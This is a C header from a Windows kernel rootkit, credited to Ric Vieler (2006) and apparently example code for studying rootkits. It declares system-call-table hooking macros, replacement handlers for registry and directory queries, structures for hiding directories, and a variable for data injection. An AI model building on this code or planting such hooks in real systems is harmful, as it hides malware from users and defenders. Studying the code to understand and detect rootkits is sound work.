// Copyright Ric Vieler, 2006
// Support header for hookManager.c

#ifndef _HOOK_MANAGER_H_
#define _HOOK_MANAGER_H_

NTSTATUS HookKernel( void );
BOOL IsSameFile( PUNICODE_STRING shortString, PUNICODE_STRING longString );
PVOID findUnresolved( PVOID pFunc );
int checkPattern( unsigned char* pattern1, unsigned char* pattern2, size_t size );
PVOID GetFunctionAddress(	PVOID BaseAddress,
							char* lpFunctionName,
							PBYTE pattern,
							size_t patternLength  );

#ifndef RtlInitEmptyUnicodeString
#define RtlInitEmptyUnicodeString(_ucStr,_buf,_bufSize) \
    ((_ucStr)->Buffer = (_buf), \
     (_ucStr)->Length = 0, \
     (_ucStr)->MaximumLength = (USHORT)(_bufSize))
#endif

// The kernel's Service Descriptor Table 
#pragma pack(1)
typedef struct ServiceDescriptorEntry {
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase;
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

// Our System Call Table
extern PVOID* NewSystemCallTable;

// Our Memory Descriptor List
extern PMDL pMyMDL;

// Needed for data injection
extern PVOID kernel32Base;

// Needed for version differences
extern ULONG majorVersion;
extern ULONG minorVersion;

#define HOOK_INDEX(functionName) *(PULONG)((PUCHAR)functionName+1)

#define HOOK(functionName, newPointer2Function, oldPointer2Function )  \
 oldPointer2Function = (PVOID) InterlockedExchange( \
 (PLONG) &NewSystemCallTable[HOOK_INDEX(functionName)], (LONG) newPointer2Function)

#define UNHOOK(functionName, oldPointer2Function)  \
 InterlockedExchange( (PLONG) &NewSystemCallTable[HOOK_INDEX(functionName)], (LONG) oldPointer2Function)

typedef NTSTATUS (*ZWMAPVIEWOFSECTION)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect );

extern ZWMAPVIEWOFSECTION OldZwMapViewOfSection;

NTSTATUS NewZwMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect );

typedef NTSTATUS (*ZWOPENKEY)(
	OUT PHANDLE KeyHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes );

extern ZWOPENKEY OldZwOpenKey;

NTSTATUS NewZwOpenKey(
	OUT PHANDLE KeyHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes );

typedef NTSTATUS (*ZWQUERYKEY)(
	IN HANDLE KeyHandle,
	IN KEY_INFORMATION_CLASS KeyInformationClass, 
	OUT PVOID KeyInformation,
	IN ULONG Length,
	OUT PULONG ResultLength );

extern ZWQUERYKEY OldZwQueryKey;

NTSTATUS NewZwQueryKey(
	IN HANDLE KeyHandle,
	IN KEY_INFORMATION_CLASS KeyInformationClass, 
	OUT PVOID KeyInformation,
	IN ULONG Length,
	OUT PULONG ResultLength );

typedef NTSTATUS (*ZWENUMERATEKEY)(
	IN HANDLE KeyHandle,
	IN ULONG Index,
	IN KEY_INFORMATION_CLASS KeyInformationClass, 
	OUT PVOID KeyInformation,
	IN ULONG Length,
	OUT PULONG ResultLength );

extern ZWENUMERATEKEY OldZwEnumerateKey;

NTSTATUS NewZwEnumerateKey(
	IN HANDLE KeyHandle,
	IN ULONG Index,
	IN KEY_INFORMATION_CLASS KeyInformationClass, 
	OUT PVOID KeyInformation,
	IN ULONG Length,
	OUT PULONG ResultLength );

typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery );

extern ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;

NTSTATUS NewZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery );


// UNDOCUMENTED

NTSYSAPI
NTSTATUS
NTAPI
ObQueryNameString(
    IN PVOID  Object,
    OUT POBJECT_NAME_INFORMATION  ObjectNameInfo,
    IN ULONG  Length,
    OUT PULONG  ReturnLength ); 

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery );

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateSection(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL );

NTSYSAPI 
NTSTATUS
NTAPI
ZwAllocateVirtualMemory(
  IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN ULONG ZeroBits,
  IN OUT PULONG RegionSize,
  IN ULONG AllocationType,
  IN ULONG Protect );

// ZwProtectVirtualMemory won't resolve!
// Need to extract from dll manually.
NTSYSAPI 
NTSTATUS 
NTAPI ZwPulseEvent( HANDLE h, PULONG p );

NTSYSAPI 
NTSTATUS
NTAPI
ZwProtectVirtualMemory(
  IN HANDLE               ProcessHandle,
  IN OUT PVOID            *BaseAddress,
  IN OUT PULONG           NumberOfBytesToProtect,
  IN ULONG                NewAccessProtection,
  OUT PULONG              OldAccessProtection );

typedef NTSTATUS (*ZWPROTECTVIRTUALMEMORY)(
  IN HANDLE               ProcessHandle,
  IN OUT PVOID            *BaseAddress,
  IN OUT PULONG           NumberOfBytesToProtect,
  IN ULONG                NewAccessProtection,
  OUT PULONG              OldAccessProtection );

extern ZWPROTECTVIRTUALMEMORY OldZwProtectVirtualMemory;

// next two structures used for directory hiding
typedef struct _FILETIME {
    DWORD dwLowDateTime; 
    DWORD dwHighDateTime; 
} FILETIME; 

typedef struct _DirEntry {
	DWORD dwLenToNext;
	DWORD dwAttr;
	FILETIME ftCreate, ftLastAccess, ftLastWrite;
	DWORD dwUnknown[ 2 ];
	DWORD dwFileSizeLow;
	DWORD dwFileSizeHigh;
	DWORD dwUnknown2[ 3 ];
	WORD wNameLen;
	WORD wUnknown;
	DWORD dwUnknown3;
	WORD wShortNameLen;
	WCHAR swShortName[ 12 ];
	WCHAR suName[ 1 ];
} DirEntry;

// Undocumented object types
extern POBJECT_TYPE* MmSectionObjectType;
extern POBJECT_TYPE* PsProcessType;

#define OBJ_INHERIT          0x00000002L
#define OBJ_PERMANENT        0x00000010L
#define OBJ_EXCLUSIVE        0x00000020L
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define OBJ_OPENIF           0x00000080L
#define OBJ_OPENLINK         0x00000100L
#define OBJ_KERNEL_HANDLE    0x00000200L

#define MAXKEYNAMELENGTH	1024

#endif

